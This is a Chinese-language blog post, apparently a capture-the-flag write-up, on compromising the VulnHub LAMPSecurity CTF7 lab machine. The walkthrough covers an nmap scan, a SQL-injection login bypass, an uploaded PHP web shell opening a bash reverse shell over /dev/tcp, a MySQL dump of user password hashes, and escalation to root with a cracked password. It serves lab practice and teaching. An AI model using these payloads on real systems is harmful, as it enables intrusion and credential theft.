+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>VulnHub_03_LAMPSECURITY: CTF7 - Ghostasky&#39;s Blog</title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='VulnHub' /><meta itemprop="name" content="VulnHub_03_LAMPSECURITY: CTF7">
+<meta itemprop="description" content=""><meta itemprop="datePublished" content="2022-02-19T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-02-19T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1210">
+<meta itemprop="keywords" content="VulnHub," /><meta property="og:title" content="VulnHub_03_LAMPSECURITY: CTF7" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://ghostasky.github.io/posts/vulnhub03/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-02-19T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-02-19T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="VulnHub_03_LAMPSECURITY: CTF7"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://ghostasky.github.io/posts/vulnhub03/" /><link rel="prev" href="http://ghostasky.github.io/posts/vulnhub02/" /><link rel="next" href="http://ghostasky.github.io/posts/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "VulnHub_03_LAMPSECURITY: CTF7",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/ghostasky.github.io\/posts\/vulnhub03\/"
+    },"genre": "posts","keywords": "VulnHub","wordcount":  1210 ,
+    "url": "http:\/\/ghostasky.github.io\/posts\/vulnhub03\/","datePublished": "2022-02-19T00:00:00+00:00","dateModified": "2022-02-19T00:00:00+00:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "作者"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              >文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              >分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              >标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              >关于</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="/images/fixit.png" data-title="/images/fixit.png" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                >文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                >分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                >标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                >关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>VulnHub_03_LAMPSECURITY: CTF7</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      Anonymous</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2022-02-19 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2022-02-19">2022-02-19</time></span>&nbsp;<span title="1210 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1300 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 3 分钟</span>&nbsp;</div>
+    </div><div class="content" id="content"><p>download：<code>https://www.vulnhub.com/entry/lampsecurity-ctf7,86/</code></p>
+<p>找到ip为：<code>192.168.188.132</code></p>
+<blockquote>
+<p>nmap参数：</p>
+<p>-Pn ：不检测主机存活</p>
+</blockquote>
+<div class="highlight" id="id-1"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>/home/kali<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn -sV 192.168.188.132                                                                               <span class="m">130</span> ⨯
+</span></span><span class="line"><span class="cl">Host discovery disabled <span class="o">(</span>-Pn<span class="o">)</span>. All addresses will be marked <span class="s1">&#39;up&#39;</span> and scan <span class="nb">times</span> will be slower.
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-02-19 03:56 EST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.188.132
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00064s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">993</span> filtered ports
+</span></span><span class="line"><span class="cl">PORT      STATE  SERVICE     VERSION
+</span></span><span class="line"><span class="cl">22/tcp    open   ssh         OpenSSH 5.3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp    open   http        Apache httpd 2.2.15 <span class="o">((</span>CentOS<span class="o">))</span>
+</span></span><span class="line"><span class="cl">139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: MYGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">901/tcp   open   http        Samba SWAT administration server
+</span></span><span class="line"><span class="cl">5900/tcp  closed vnc
+</span></span><span class="line"><span class="cl">8080/tcp  open   http        Apache httpd 2.2.15 <span class="o">((</span>CentOS<span class="o">))</span>
+</span></span><span class="line"><span class="cl">10000/tcp open   http        MiniServ 1.610 <span class="o">(</span>Webmin httpd<span class="o">)</span>
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:9D:12:A9 <span class="o">(</span>VMware<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 46.98 seconds</span></span></code></pre></div><p>8080有个web服务，登录框：<code>' or 1=1 -- .</code>，直接注入进去</p>
+<p>在reading上传shell</p>
+<div class="highlight" id="id-2"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">system</span><span class="p">(</span><span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/192.168.188.129/4444 0&gt;&amp;1&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">  
+</span></span></span></code></pre></div><p><img loading="lazy" src="/posts/vulnhub03/image-20220219171650551.png" alt="image-20220219171650551" srcset="/posts/vulnhub03/image-20220219171650551.png?size=small, /posts/vulnhub03/image-20220219171650551.png?size=medium 1.5x, /posts/vulnhub03/image-20220219171650551.png?size=large 2x" data-title="image-20220219171650551" style="--width: 555px;--aspect-ratio: 555 / 650;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>但是不知道上传的位置，扫一下：</p>
+<div class="highlight" id="id-3"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>/home/kali<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# dirb http://192.168.188.132                                                                                <span class="m">255</span> ⨯
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">DIRB v2.22    
+</span></span><span class="line"><span class="cl">By The Dark Raver
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">START_TIME: Sat Feb <span class="m">19</span> 04:17:38 <span class="m">2022</span>
+</span></span><span class="line"><span class="cl">URL_BASE: http://192.168.188.132/
+</span></span><span class="line"><span class="cl">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">GENERATED WORDS: <span class="m">4612</span>                                                          
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">---- Scanning URL: http://192.168.188.132/ ----
+</span></span><span class="line"><span class="cl">+ http://192.168.188.132/about <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:4910<span class="o">)</span>                                                                 
+</span></span><span class="line"><span class="cl"><span class="o">==</span>&gt; DIRECTORY: http://192.168.188.132/assets/                                                                       
+</span></span><span class="line"><span class="cl">+ http://192.168.188.132/backups <span class="o">(</span>CODE:301<span class="p">|</span>SIZE:335<span class="o">)</span>                                                                
+</span></span><span class="line"><span class="cl">+ http://192.168.188.132/cgi-bin/ <span class="o">(</span>CODE:403<span class="p">|</span>SIZE:291<span class="o">)</span>                                                               
+</span></span><span class="line"><span class="cl">+ http://192.168.188.132/contact <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:5017<span class="o">)</span>                                                               
+</span></span><span class="line"><span class="cl"><span class="o">==</span>&gt; DIRECTORY: http://192.168.188.132/css/                                                                          
+</span></span><span class="line"><span class="cl">+ http://192.168.188.132/db <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:3904<span class="o">)</span>                                                                    
+</span></span><span class="line"><span class="cl">+ http://192.168.188.132/default <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:6058<span class="o">)</span>                                                               
+</span></span><span class="line"><span class="cl">+ http://192.168.188.132/footer <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:3904<span class="o">)</span>                                                                
+</span></span><span class="line"><span class="cl">+ http://192.168.188.132/header <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:3904<span class="o">)</span>                                                                
+</span></span><span class="line"><span class="cl"><span class="o">==</span>&gt; DIRECTORY: http://192.168.188.132/img/                                                                          
+</span></span><span class="line"><span class="cl"><span class="o">==</span>&gt; DIRECTORY: http://192.168.188.132/inc/                                                                          
+</span></span><span class="line"><span class="cl">+ http://192.168.188.132/index.php <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:6058<span class="o">)</span>                                                             
+</span></span><span class="line"><span class="cl"><span class="o">==</span>&gt; DIRECTORY: http://192.168.188.132/js/                                                                           
+</span></span><span class="line"><span class="cl">+ http://192.168.188.132/newsletter <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:4037<span class="o">)</span>                                                            
+</span></span><span class="line"><span class="cl">+ http://192.168.188.132/phpinfo <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:58773<span class="o">)</span>                                                              
+</span></span><span class="line"><span class="cl">+ http://192.168.188.132/profile <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:3977<span class="o">)</span>              </span></span></code></pre></div><p>注意到：http://192.168.188.132/assets/</p>
+<div class="highlight" id="id-4"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nc -lp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">bash-4.1$ ls
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">0223_cybersecurity_china_us_lieberthal_singer_pdf_english.pdf
+</span></span><span class="line"><span class="cl">1.php
+</span></span><span class="line"><span class="cl">88x31.png
+</span></span><span class="line"><span class="cl">apple-touch-icon-114-precomposed.png
+</span></span><span class="line"><span class="cl">apple-touch-icon-144-precomposed.png
+</span></span><span class="line"><span class="cl">apple-touch-icon-57-precomposed.png
+</span></span><span class="line"><span class="cl">apple-touch-icon-72-precomposed.png
+</span></span><span class="line"><span class="cl">higher-eduction-national-security.pdf
+</span></span><span class="line"><span class="cl">re.php
+</span></span><span class="line"><span class="cl">reverse_php_shell.php
+</span></span><span class="line"><span class="cl">bash-4.1$ python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">bash-4.1$ mysql -u root
+</span></span><span class="line"><span class="cl">mysql -u root
+</span></span><span class="line"><span class="cl">Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
+</span></span><span class="line"><span class="cl">Your MySQL connection id is <span class="m">242</span>
+</span></span><span class="line"><span class="cl">Server version: 5.1.66 Source distribution
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2012, Oracle and/or its affiliates. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Oracle is a registered trademark of Oracle Corporation and/or its
+</span></span><span class="line"><span class="cl">affiliates. Other names may be trademarks of their respective
+</span></span><span class="line"><span class="cl">owners.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mysql&gt; show databases<span class="p">;</span>
+</span></span><span class="line"><span class="cl">show databases<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Database           <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> information_schema <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> mysql              <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> roundcube          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> website            <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="m">4</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mysql&gt; use website<span class="p">;</span>
+</span></span><span class="line"><span class="cl">use website<span class="p">;</span>
+</span></span><span class="line"><span class="cl">Reading table information <span class="k">for</span> completion of table and column names
+</span></span><span class="line"><span class="cl">You can turn off this feature to get a quicker startup with -A
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Database changed
+</span></span><span class="line"><span class="cl">mysql&gt; show tables<span class="p">;</span>
+</span></span><span class="line"><span class="cl">show tables<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+-------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Tables_in_website <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> contact           <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> documents         <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> hits              <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> log               <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> newsletter        <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> payment           <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> trainings         <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> trainings_x_users <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> users             <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------------------+
+</span></span><span class="line"><span class="cl"><span class="m">9</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> * from users
+</span></span><span class="line"><span class="cl"><span class="k">select</span> * from users
+</span></span><span class="line"><span class="cl">    -&gt; <span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">;</span>
+</span></span><span class="line"><span class="cl">+-------------------------------+----------------------------------+----------+---------------------+---------+-----------------+--------------------------------------------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> username                      <span class="p">|</span> password                         <span class="p">|</span> is_admin <span class="p">|</span> last_login          <span class="p">|</span> user_id <span class="p">|</span> realname        <span class="p">|</span> profile                                                                  <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------------------------------+----------------------------------+----------+---------------------+---------+-----------------+--------------------------------------------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> brian@localhost.localdomain   <span class="p">|</span> e22f07b17f98e0d9d364584ced0e3c18 <span class="p">|</span>        <span class="m">1</span> <span class="p">|</span> 2012-12-19 11:30:54 <span class="p">|</span>       <span class="m">3</span> <span class="p">|</span> Brian Hershel   <span class="p">|</span> Brian is our technical brains behind the operations and a chief trainer. <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> john@localhost.localdomain    <span class="p">|</span> 0d9ff2a4396d6939f80ffe09b1280ee1 <span class="p">|</span>        <span class="m">1</span> <span class="p">|</span> NULL                <span class="p">|</span>       <span class="m">4</span> <span class="p">|</span> John Durham     <span class="p">|</span>                                                                          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> alice@localhost.localdomain   <span class="p">|</span> 2146bf95e8929874fc63d54f50f1d2e3 <span class="p">|</span>        <span class="m">1</span> <span class="p">|</span> NULL                <span class="p">|</span>       <span class="m">5</span> <span class="p">|</span> Alice Wonder    <span class="p">|</span>                                                                          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ruby@localhost.localdomain    <span class="p">|</span> 9f80ec37f8313728ef3e2f218c79aa23 <span class="p">|</span>        <span class="m">1</span> <span class="p">|</span> NULL                <span class="p">|</span>       <span class="m">6</span> <span class="p">|</span> Ruby Spinster   <span class="p">|</span>                                                                          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> leon@localhost.localdomain    <span class="p">|</span> 5d93ceb70e2bf5daa84ec3d0cd2c731a <span class="p">|</span>        <span class="m">1</span> <span class="p">|</span> NULL                <span class="p">|</span>       <span class="m">7</span> <span class="p">|</span> Leon Parnetta   <span class="p">|</span>                                                                          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> julia@localhost.localdomain   <span class="p">|</span> ed2539fe892d2c52c42a440354e8e3d5 <span class="p">|</span>        <span class="m">1</span> <span class="p">|</span> NULL                <span class="p">|</span>       <span class="m">8</span> <span class="p">|</span> Julia Fields    <span class="p">|</span>                                                                          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> michael@localhost.localdomain <span class="p">|</span> 9c42a1346e333a770904b2a2b37fa7d3 <span class="p">|</span>        <span class="m">0</span> <span class="p">|</span> NULL                <span class="p">|</span>       <span class="m">9</span> <span class="p">|</span> Michael Saint   <span class="p">|</span>                                                                          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> bruce@localhost.localdomain   <span class="p">|</span> 3a24d81c2b9d0d9aaf2f10c6c9757d4e <span class="p">|</span>        <span class="m">0</span> <span class="p">|</span> NULL                <span class="p">|</span>      <span class="m">10</span> <span class="p">|</span> Bruce Pottricks <span class="p">|</span>                                                                          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> neil@localhost.localdomain    <span class="p">|</span> 4773408d5358875b3764db552a29ca61 <span class="p">|</span>        <span class="m">0</span> <span class="p">|</span> NULL                <span class="p">|</span>      <span class="m">11</span> <span class="p">|</span> Neil Felstein   <span class="p">|</span>                                                                          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> charles@localhost.localdomain <span class="p">|</span> b2a97bcecbd9336b98d59d9324dae5cf <span class="p">|</span>        <span class="m">0</span> <span class="p">|</span> NULL                <span class="p">|</span>      <span class="m">12</span> <span class="p">|</span> Charles Adams   <span class="p">|</span>                                                                          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> foo@bar.com                   <span class="p">|</span> 4cb9c8a8048fd02294477fcb1a41191a <span class="p">|</span>        <span class="m">0</span> <span class="p">|</span> NULL                <span class="p">|</span>      <span class="m">36</span> <span class="p">|</span>                 <span class="p">|</span>                                                                          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> test@nowhere.com              <span class="p">|</span> 098f6bcd4621d373cade4e832627b4f6 <span class="p">|</span>        <span class="m">0</span> <span class="p">|</span> NULL                <span class="p">|</span>     <span class="m">113</span> <span class="p">|</span>                 <span class="p">|</span>                                                                          <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------------------------------+----------------------------------+----------+---------------------+---------+-----------------+--------------------------------------------------------------------------+</span></span></code></pre></div><p>用一些脚本破解hash，或者在线的网站</p>
+<div class="highlight" id="id-5"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">bash-4.1$ su brian
+</span></span><span class="line"><span class="cl">su brian
+</span></span><span class="line"><span class="cl">Password: my2cents
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>brian@localhost assets<span class="o">]</span>$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>501<span class="o">(</span>brian<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>501<span class="o">(</span>brian<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>501<span class="o">(</span>brian<span class="o">)</span>,10<span class="o">(</span>wheel<span class="o">)</span>,500<span class="o">(</span>webdev<span class="o">)</span>,512<span class="o">(</span>admin<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:httpd_t:s0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>brian@localhost assets<span class="o">]</span>$ sudo su
+</span></span><span class="line"><span class="cl">sudo su
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">We trust you have received the usual lecture from the <span class="nb">local</span> System
+</span></span><span class="line"><span class="cl">Administrator. It usually boils down to these three things:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">#1) Respect the privacy of others.</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#2) Think before you type.</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#3) With great power comes great responsibility.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> brian: my2cents
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>root@localhost assets<span class="o">]</span><span class="c1"># </span></span></span></code></pre></div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2022-02-19 00:00:00">更新于 2022-02-19&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://ghostasky.github.io/posts/vulnhub03/" data-title="VulnHub_03_LAMPSECURITY: CTF7" data-hashtags="VulnHub"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://ghostasky.github.io/posts/vulnhub03/" data-hashtag="VulnHub"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://ghostasky.github.io/posts/vulnhub03/" data-title="VulnHub_03_LAMPSECURITY: CTF7"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/vulnhub/" class="post-tag" title="标签 - VulnHub">VulnHub</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/vulnhub02/" class="post-nav-item" rel="prev" title="VulnHub_02_LAMPSECURITY: CTF5"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>VulnHub_02_LAMPSECURITY: CTF5</a>
+      <a href="/posts/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="post-nav-item" rel="next" title="Nodejs原型链污染">Nodejs原型链污染<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.123.8"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
